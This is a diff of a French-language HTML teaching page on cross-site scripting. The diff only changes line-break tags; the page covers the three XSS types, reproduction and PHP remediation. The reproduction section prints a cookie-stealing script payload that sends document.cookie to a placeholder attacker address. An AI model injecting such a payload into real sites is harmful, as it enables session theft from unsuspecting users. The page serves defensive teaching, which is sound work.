@@ -27,44 +27,44 @@
 </nav>
 <div id="main">
   <h2>description vulgarisé de la faille</h2>
-  <p>Les attaques de Cross-Site Scripting (XSS) sont un type d’injection, dans lequel des scripts malveillants sont injectés dans des sites Web. Les attaques XSS se produisent lorsqu’un attaquant utilise une application Web pour envoyer du code malveillant, généralement sous la forme d’un script côté navigateur, à un utilisateur. Les failles qui permettent à ces attaques de réussir sont assez répandues et se produisent partout où une application Web utilise l’entrée d’un utilisateur sans que la sortie qu’elle génère ne soit valider.</br>
+  <p>Les attaques de Cross-Site Scripting (XSS) sont un type d’injection, dans lequel des scripts malveillants sont injectés dans des sites Web. Les attaques XSS se produisent lorsqu’un attaquant utilise une application Web pour envoyer du code malveillant, généralement sous la forme d’un script côté navigateur, à un utilisateur. Les failles qui permettent à ces attaques de réussir sont assez répandues et se produisent partout où une application Web utilise l’entrée d’un utilisateur sans que la sortie qu’elle génère ne soit valider.<br>
   Un attaquant peut utiliser XSS pour envoyer un script malveillant à un utilisateur sans méfiance. Le navigateur de l’utilisateur n’a aucun moyen de savoir que le script n'est pas approuvé et exécutera le script parce qu’il pense que le script provient d’une source fiable.Le script malveillant pourra par exemple accéder à tous les cookies, jetons de session ou autres informations sensibles conservés par le navigateur et utilisés avec ce site. Ces scripts peuvent même réécrire le contenu de la page HTML.</p>
   <h2>explication de comment reproduire la faille</h2>
-  La vulnérabilité XSS peut être trouvée dans trois types : </br>
+  La vulnérabilité XSS peut être trouvée dans trois types : <br>
   <ol>
 <li>Stockage XSS</li>
 <li>XSS réfléchi</li>
 <li>Basé sur XSS DOM</li>
 </ol>
-</br>
+<br>
 <p>
 La grande différence entre ces trois types est que dans le XSS stocké, les données utilisateur sont enregistrées dans la base de données contrairement à la reflété et les vulnérabilités XSS DOM-basé. Maintenant, pour le XSS reflété et les vulnérabilités XSS basées sur DOM, la différence est liée au flux de données.
-</br>
+<br>
 Dans le XSS basé sur DOM, le navigateur gère l'intégralité du flux de données entaché de la source au récepteur contrairement au XSS réfléchi.
-</br>
+<br>
 Cette faille peut permettre de voler des informations utilisateur, prendre le contrôle d'une application, prise de contrôle du serveur ou de la machine client.
-</br>
+<br>
 Ici, je prendrais pour exemple une simple page php qui permet a l'utilisateur d'effectuer une recherche (XSS Réfléchie).
-</br>
+<br>
 On peut imaginer par exemple souhaiter voler les cookies d'un utilisateur. Pour cela, on va créer un script qui va récupérer les cookies et les envoyer à notre serveur.
-</br>
+<br>
 <pre>&lt;script&gt;var i=new Image;i.src=&quot;http://192.168.0.X:8888/?&quot;+document.cookie;&lt;/script&gt;</pre>
-</br>
+<br>
 </p>
 
   <h2>explication de comment corriger la faille</h2>
   <h3>Assainissement des entrées</h3>
   <p>
 Pour la plupart des applications PHP, htmlspecialchars() sera notre meilleur ami. htmlspecialchars(), fourni sans argument, convertira les caractères spéciaux en entités HTML.
-</br>
+<br>
 addslashes() est souvent utilisée pour échapper des entrées lorsqu’elle est insérée dans des variables JavaScript.
-</br>
+<br>
 OWASP répertorie également d’autres fonctions qui peuvent être utilisées pour assainir les entrées, telles qu’htmlentities(), strip_tags(), filter_var(), et bien d’autres.
 <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP XSS Prevention Cheat Sheet.</a>
-</br>
+<br>
 On retrouve aussi des librairies php afin d’améliorer la sécurité de l’application, par exemple <a href="http://htmlpurifier.org/">HTML Purifier</a> qui permet de nettoyer les entrées utilisateur.Mais encore :
 <a href="https://code.google.com/p/php-antixss/">PHP Anti-XSS</a>
-</br>
+<br>
   </p>
   <p>Repository où l’on retrouve une <a href="https://github.com/voku/anti-xss">Cheat-Sheet PHP Anti XSS</a> 
   </p>
